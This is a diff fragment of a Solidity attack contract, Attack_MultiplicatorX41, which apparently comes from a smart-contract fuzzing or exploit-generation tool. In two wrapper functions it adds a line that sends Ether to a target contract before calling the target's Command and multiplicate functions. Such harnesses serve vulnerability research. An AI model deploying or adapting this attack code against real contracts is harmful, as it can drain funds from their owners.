@@ -15,10 +15,12 @@ contract Attack_MultiplicatorX41 {
   } 
 
   function vultron_Command(uint256 vultron_amount, address adr, bytes data) public payable{
+    target_contract.send(vultron_amount);
     target_contract.Command.value(vultron_amount)(adr, data);
   } 
 
   function vultron_multiplicate(uint256 vultron_amount, address adr) public payable{
+    target_contract.send(vultron_amount);
     target_contract.multiplicate.value(vultron_amount)(adr);
   } 
 
